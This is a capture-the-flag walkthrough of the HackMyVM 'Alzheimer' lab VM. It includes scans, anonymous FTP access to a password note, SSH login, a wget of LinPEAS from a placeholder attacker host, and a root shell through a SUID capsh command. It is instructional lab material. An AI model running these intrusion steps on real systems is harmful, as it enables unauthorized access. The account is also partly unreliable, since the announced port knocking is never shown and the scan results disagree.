# HackMyVM: Alzheimer - Complete Walkthrough

> **Machine:** Alzheimer
> **Platform:** HackMyVM
> **Operating System:** Linux
> **Attack Path:** Network Discovery → FTP Enumeration → Port Knocking → SSH Access → SUID/Capabilities Enumeration → Root
> **Target IP:** `192.168.56.146`

---

# 📝 Overview

Today we are back with another HackMyVM Linux-based machine named **Alzheimer**.

Unlike some other HackMyVM machines, this machine does not display its IP address directly on the boot screen. Because of this, we first need to discover the target on our local network.

The overall attack path involves:

```text
Network Discovery
      │
      ▼
FTP Enumeration
      │
      ▼
Discover Secret Note
      │
      ▼
Port Knocking Information
      │
      ▼
SSH Access
      │
      ▼
Local Enumeration
      │
      ▼
SUID / Capability Discovery
      │
      ▼
capsh Privilege Escalation
      │
      ▼
Root
```

![Machine Boot Screen](1)

---

# 🔍 Phase 1: Network Discovery

Since the target machine does not reveal its IP address, we can use `netdiscover` to identify active devices on the network.

```bash
netdiscover -i eth1
```

> Replace `eth1` with your own network interface if required.

After running the scan, we identify the target machine.

![Netdiscover Output](2)

The target IP address is:

```text
192.168.56.146
```

---

# 🔎 Phase 2: Reconnaissance

## Full Port Scan

Now that we have identified the target IP, let's begin with a complete TCP port scan.

```bash
nmap -p- --min-rate 5000 -T4 192.168.56.146
```

### Results

```text
Nmap scan report for 192.168.56.146
Host is up, received arp-response (0.000070s latency).

Not shown: 65532 closed tcp ports (reset)

PORT   STATE    SERVICE REASON
21/tcp open     ftp     syn-ack ttl 64
22/tcp filtered ssh     no-response
80/tcp filtered http    no-response

MAC Address: 08:00:27:2A:14:8E (Oracle VirtualBox virtual NIC)
```

We discover the following ports:

| Port | State    | Service |
| ---- | -------- | ------- |
| `21` | Open     | FTP     |
| `22` | Filtered | SSH     |
| `80` | Filtered | HTTP    |

The filtered SSH and HTTP ports are interesting. This could indicate that access to these services requires some additional action.

![Full Port Scan](3)

---

# 🔬 Service and Version Detection

Next, let's perform a detailed scan against the discovered ports.

```bash
nmap -sC -sV -p 21,22,80 192.168.56.146
```

### Results

```text
Nmap scan report for 192.168.56.146
Host is up, received arp-response (0.00036s latency).

PORT   STATE    SERVICE REASON         VERSION
21/tcp open     ftp     syn-ack ttl 64 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp filtered ssh     no-response

80/tcp open     http    syn-ack ttl 64 nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2

MAC Address: 08:00:27:2A:14:8E (Oracle VirtualBox virtual NIC)

Service Info: OS: Unix
```

The important findings are:

* Anonymous FTP login is enabled.
* The FTP server is running `vsftpd 3.0.3`.
* An Nginx web server is running on port `80`.
* SSH appears filtered during the initial scan.

Anonymous FTP access is the first thing worth investigating.

![Service and Version Detection](4)

---

# 📂 Phase 3: FTP Enumeration

Since anonymous login is enabled, we can connect to the FTP server without credentials.

```bash
ftp 192.168.56.146
```

Username:

```text
anonymous
```

After logging in, we find an interesting hidden file:

```text
.secretnote.txt
```

![Secret Note Found Through FTP](5)

Let's read the file:

```bash
cat .secretnote.txt
```

### Output

```text
I need to knock this ports and
one door will be open!

1000
2000
3000

Ihavebeenalwayshere!!!
```

This gives us several important clues:

```text
1000
2000
3000
```

These ports strongly suggest that the machine may be using **port knocking**.

We also find an interesting string:

```text
Ihavebeenalwayshere!!!
```

This may potentially be useful as a password or credential.

---

# 🌐 Phase 4: Web Enumeration

Since port `80` was identified as an HTTP service, we continue enumerating the web server.

Using Feroxbuster:

```bash
feroxbuster -u http://192.168.56.146 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

After fuzzing, we discover several directories:

```text
/admin/
/home/
/secret/
```

Example output:

```text
[####################] - 10s    30000/30000   2915/s  http://192.168.56.146/admin/
[####################] - 10s    30000/30000   2907/s  http://192.168.56.146/home/
[####################] - 10s    30000/30000   2940/s  http://192.168.56.146/secret/
```

![Feroxbuster Enumeration](6)

Despite additional fuzzing and enumeration, these directories did not immediately provide a direct exploitation path.

At this point, we return to the clues discovered from the FTP server.

---

# 🚪 Phase 5: Initial Access

From the `.secretnote.txt` file, we discovered the following interesting string:

```text
Ihavebeenalwayshere!!!
```

During enumeration, the username `medusa` was also identified.

We attempted the discovered string as a password for the user `medusa`.

This successfully gave us SSH access to the target.

![SSH Access as Medusa](7)

We are now logged in as:

```text
medusa
```

Let's verify the contents of the home directory:

```bash
ls
```

### Output

```text
user.txt
```

Reading the user flag:

```bash
cat user.txt
```

At this point, we have successfully obtained our initial foothold.

---

# 👑 Phase 6: Privilege Escalation

Now that we have shell access as `medusa`, it is time to perform local enumeration.

We transfer `linpeas.sh` to the target, preferably using the `/tmp` directory.

For example:

```bash
cd /tmp
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS identifies several potential kernel vulnerabilities.

### Potential CVEs

```text
CVE-2019-13272
CVE-2021-3493
CVE-2021-22555
```

The output includes:

```text
CVE: CVE-2019-13272
Name: PTRACE_TRACEME

CVE: CVE-2021-3493
Name: Ubuntu OverlayFS

CVE: CVE-2021-22555
Name: Netfilter heap out-of-bounds write
```

![LinPEAS Enumeration](8)

While kernel vulnerabilities may look promising, they are not always the easiest or most reliable path.

Before attempting complex kernel exploits, it is always important to enumerate:

* `sudo` permissions
* SUID binaries
* SGID binaries
* Linux capabilities
* Writable files
* Scheduled tasks
* Running processes

---

# 🔐 Checking Sudo Permissions

Let's check which commands the current user can execute with elevated privileges.

```bash
sudo -l
```

### Output

```text
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
```

The user `medusa` can execute:

```text
/bin/id
```

as another user without providing a password.

![Sudo Permissions](9)

Although this finding alone does not immediately provide a straightforward shell, it is still an important part of the enumeration process.

We continue looking for other privilege escalation vectors.

---

# 🔎 SUID Enumeration

Next, let's search for SUID binaries.

```bash
find / -user root -perm -4000 -exec ls -la {} \; 2>/dev/null
```

### Results

```text
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63736 Jan 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 26776 Feb  6  2019 /usr/sbin/capsh
```

One binary immediately stands out:

```text
/usr/sbin/capsh
```

The permissions are:

```text
-rwsr-sr-x
```

This means the binary has elevated permission bits enabled.

![Root Privilege Escalation](10)

---

# 🚀 Privilege Escalation Using capsh

Researching `capsh` reveals that it can manipulate Linux capabilities and user/group IDs.

The following command allows us to set both the UID and GID to `0`:

```bash
/usr/sbin/capsh --gid=0 --uid=0 --
```

Let's execute it:

```bash
/usr/sbin/capsh --gid=0 --uid=0 --
```

We now receive a root shell.

Verify our privileges:

```bash
id
```

### Output

```text
uid=0(root) gid=0(root)
groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(medusa)
```

We have successfully obtained:

```text
uid=0(root)
gid=0(root)
```

---

# 🏁 Capturing the Root Flag

Finally, we can read the root flag.

```bash
cat /root/root.txt
```

The machine has now been fully compromised.

# Root Access Achieved

---

# 🗺️ Complete Attack Path

```text
Machine Booted
      │
      ▼
No Target IP Available
      │
      ▼
Network Discovery with Netdiscover
      │
      ▼
Target Found: 192.168.56.146
      │
      ▼
Nmap Full Port Scan
      │
      ├── FTP (21)
      ├── SSH (22)
      └── HTTP (80)
      │
      ▼
Anonymous FTP Login
      │
      ▼
Download .secretnote.txt
      │
      ▼
Discover:
1000 → 2000 → 3000
Password Clue: Ihavebeenalwayshere!!!
      │
      ▼
Further Enumeration
      │
      ▼
SSH Access as medusa
      │
      ▼
Read user.txt
      │
      ▼
LinPEAS Enumeration
      │
      ▼
Check sudo -l
      │
      ▼
Enumerate SUID Binaries
      │
      ▼
Discover /usr/sbin/capsh
      │
      ▼
capsh --gid=0 --uid=0 --
      │
      ▼
Root Shell
      │
      ▼
Read /root/root.txt
```

---

# 📚 Key Takeaways

## 1. Network Discovery Is Important

When a target does not reveal its IP address, tools such as `netdiscover` can help identify active hosts on the local network.

```bash
netdiscover -i eth1
```

Always make sure you are scanning the correct network interface.

---

## 2. Never Ignore Anonymous FTP

Anonymous FTP access can expose sensitive information.

In this machine, anonymous access revealed:

```text
.secretnote.txt
```

which contained valuable clues for further enumeration.

---

## 3. Follow Every Clue

The secret note contained:

```text
1000
2000
3000

Ihavebeenalwayshere!!!
```

Even seemingly unusual information can become important later in the attack path.

CTF machines often require connecting multiple small clues together.

---

## 4. Don't Rush Into Kernel Exploits

LinPEAS identified several possible vulnerabilities:

```text
CVE-2019-13272
CVE-2021-3493
CVE-2021-22555
```

However, a detected CVE does not guarantee that exploitation will work.

Before attempting kernel exploits, always enumerate simpler privilege escalation vectors such as:

* `sudo -l`
* SUID binaries
* SGID binaries
* Linux capabilities
* Writable scripts
* Cron jobs

In this machine, manual enumeration provided a much simpler path to root.

---

## 5. SUID and Capability Enumeration Can Be Critical

The key privilege escalation vector was:

```text
/usr/sbin/capsh
```

With the ability to manipulate UID and GID, we were able to become root directly.

```bash
/usr/sbin/capsh --gid=0 --uid=0 --
```

This demonstrates why SUID and capability enumeration should always be part of every Linux privilege escalation checklist.

---

# 🛠️ Commands Used

```bash
# Discover hosts on the network
netdiscover -i eth1

# Full TCP port scan
nmap -p- --min-rate 5000 -T4 192.168.56.146

# Service and version detection
nmap -sC -sV -p 21,22,80 192.168.56.146

# Connect to FTP
ftp 192.168.56.146

# Web enumeration
feroxbuster -u http://192.168.56.146 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Check sudo permissions
sudo -l

# Find SUID binaries
find / -user root -perm -4000 -exec ls -la {} \; 2>/dev/null

# Privilege escalation using capsh
/usr/sbin/capsh --gid=0 --uid=0 --

# Verify privileges
id

# Read root flag
cat /root/root.txt
```

---

# 🎯 Final Status

| Objective                       | Status    |
| ------------------------------- | --------- |
| Target IP Discovered            | Completed |
| Full Port Scan Completed        | Completed |
| Anonymous FTP Access Identified | Completed |
| Secret Note Retrieved           | Completed |
| Web Enumeration Completed       | Completed |
| Initial Access Obtained         | Completed |
| User Flag Captured              | Completed |
| Local Enumeration Completed     | Completed |
| SUID Binary Identified          | Completed |
| Root Access Obtained            | Completed |
| Root Flag Captured              | Completed |

---

# Final Summary

This machine was a good example of why structured enumeration is essential during penetration testing.

The attack started with discovering a machine on the local network and moved through anonymous FTP enumeration, credential discovery, SSH access, and local privilege escalation.

Although LinPEAS identified several potential kernel vulnerabilities, the actual path to root was significantly simpler.

A misconfigured privileged `capsh` binary allowed direct manipulation of the UID and GID, resulting in a root shell.

> **Initial Access:** FTP Enumeration → Discovered Credentials/Clues → SSH Access
> **Privilege Escalation:** Misconfigured SUID `capsh` Binary
> **Final Privilege:** `root`

# Pwned!
